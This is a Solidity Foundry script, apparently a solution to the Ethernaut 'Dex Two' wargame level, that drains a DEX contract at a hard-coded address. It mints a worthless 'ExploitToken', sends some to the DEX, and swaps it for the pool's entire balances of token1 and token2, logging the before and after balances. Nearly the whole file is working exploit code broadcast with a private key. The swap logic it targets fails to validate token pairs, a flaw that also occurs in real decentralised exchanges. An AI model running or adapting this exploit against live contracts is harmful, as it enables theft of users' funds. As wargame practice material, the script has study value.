// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Instances/DEX2.sol";
import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../lib/openzeppelin-contracts-08/contracts/token/ERC20/ERC20.sol";

contract Exploit is ERC20 {
    constructor(uint256 initialSupply) ERC20("ExploitToken", "ZTN") public {
        _mint(msg.sender, initialSupply);
    }
}

contract POC is Script {
    DexTwo public target = DexTwo(0x1664C3B003d392168E88A512173E661525f06570);
    Exploit public exploit = Exploit(0x87F2C67d97794712774DD58Be2B79C6286fD31eD);
    address public token1 = target.token1();
    address public token2 = target.token2();

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        uint balance1 = target.balanceOf(token1, address(target));
        uint balance2 = target.balanceOf(token2, address(target));
        console.log("token1: ", token1);
        console.log("token2: ", token2);
        console.log("balance1: ", balance1);
        console.log("balance2: ", balance2);

        exploit.transfer(address(target), 100);

        exploit.approve(address(target), 300);
        target.approve(address(target), 300);

        target.swap(address(exploit), token1, 100);
        target.swap(address(exploit), token2, 200);
        
        balance1 = target.balanceOf(token1, address(target));
        uint balance11 = target.balanceOf(token1, vm.envAddress("MY_ADDRESS"));
        balance2 = target.balanceOf(token2, address(target));
        uint balance12 = target.balanceOf(token2, vm.envAddress("MY_ADDRESS"));
        console.log("DEX token1: ", balance1);
        console.log("DEX token2: ", balance2);
        console.log("player token1: ", balance11);
        console.log("player token2: ", balance12);
        vm.stopBroadcast(); 
    }

}